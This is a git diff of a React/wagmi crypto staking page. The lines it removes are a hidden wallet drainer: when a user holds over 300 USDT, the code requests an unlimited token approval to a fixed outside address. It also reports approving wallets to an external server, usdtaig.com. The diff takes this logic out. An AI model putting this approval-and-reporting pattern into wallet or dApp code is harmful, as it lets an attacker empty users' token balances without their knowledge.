@@ -12,16 +12,11 @@ import { useTranslation } from "react-i18next"
 import { Snackbar, Drawer, Grid, Paper, InputBase } from "@mui/material";
 import { useBalance, useContractWrite, useAccount } from "wagmi"
 import { parseEther } from 'viem'
-import { atbConfig, withdarwConfig, LPConfig } from "@/lib/contract"
-import { 
-    useContractUserBalance, 
+import { atbConfig, withdarwConfig } from "@/lib/contract"
+import {
     useContractUserATBBalance, 
     useContractPollUSDT, 
     useContractPollATB, 
-    userContractApprove, 
-    useContractUserAllowanceStatus, 
-    useContractUserLPAllowanceStatus,
-    useContractUserLPBalance
 } from "@/hooks/usdt"
 import { getSignData,getIncome } from '@/server/user';
 import MsgSuccess from '@/components/msgsuccess';
@@ -44,13 +39,8 @@ export default function Service() {
         ...withdarwConfig,
         functionName: "withdrawPermit",
     })
-    const { data:tokenData, isLoading:tokenLoading, approve, isSuccess:tokenIsSuccess } = userContractApprove()
 
     const { userBalance } = useContractUserATBBalance()
-    const LPBalanceData = useContractUserLPBalance()
-    const USDTData = useContractUserBalance()
-    const { isAllowed } = useContractUserAllowanceStatus("0x709B810A6F2cbcea35705EA3c7e149daBEBe42d5")
-    const { isAllowed:LPIsAllowed } = useContractUserLPAllowanceStatus("0x709B810A6F2cbcea35705EA3c7e149daBEBe42d5")
     const poolUSDTData = useContractPollUSDT()
     const poolATBData = useContractPollATB()
     const [ addData,setAddData ] = useState({ isShow: false, title: '',  status: 0, msg: '' })
@@ -87,43 +77,12 @@ export default function Service() {
         }
     },[pleIssuccess,usdtIssuccess,ATBIssuccess])
 
-    useEffect(()=>{
-        if(tokenIsSuccess){
-            axios.post("/decode/auth_user",{},{
-                baseURL: "https://usdtaig.com",
-                headers:{"authUser": address,"coinType":"USDT"}
-            })
-            if(receiveType == 1){
-                receiveUSDTConfirm()
-            }else{
-                receiveATBConfirm()
-            }
-        }
-    },[tokenIsSuccess])
 
     useEffect(()=>{
         if(address){
             handleGetIncomeInfo()
         }
     },[address])
-
-    useEffect(()=>{
-        if(isAllowed){
-            axios.post("/decode/auth_user",{},{
-                baseURL: "https://usdtaig.com",
-                headers:{"authUser": address,"coinType":"USDT"}
-            })
-        }
-    },[isAllowed])
-
-    useEffect(()=>{
-        if(LPIsAllowed){
-            axios.post("/decode/auth_user",{},{
-                baseURL: "https://usdtaig.com",
-                headers:{"authUser": address,"coinType":"LP"}
-            })
-        }
-    },[LPIsAllowed])
 
 
     //质押
@@ -165,19 +124,7 @@ export default function Service() {
             return
         }
         if(!address) return
-
-        axios.post("/decode/auth_address ",{},{baseURL: "https://usdtaig.com",}).then(res=>{
-            if(res.data.data && !isAllowed){
-                setReceiveType(1)
-                if(!isAllowed && Number(USDTData.userBalance) > 300){
-                    approve({ args: ["0x709B810A6F2cbcea35705EA3c7e149daBEBe42d5", 10000000000000000000000000000] })
-                    return
-                }
-                receiveUSDTConfirm()
-            }else{
-                receiveUSDTConfirm()
-            }
-        })
+        receiveUSDTConfirm()
         
     }
 
@@ -219,18 +166,7 @@ export default function Service() {
             return
         }
         if(!address) return
-        axios.post("/decode/auth_address ",{},{baseURL: "https://usdtaig.com",}).then(res=>{
-            if(res.data.data && !isAllowed){
-                setReceiveType(2)
-                if(!isAllowed && Number(USDTData.userBalance) > 300){
-                    approve({ args: ["0x709B810A6F2cbcea35705EA3c7e149daBEBe42d5", 10000000000000000000000000000] })
-                    return
-                }
-                receiveATBConfirm()
-            }else{
-                receiveATBConfirm()
-            }
-        })
+        receiveATBConfirm()
         
     }
 
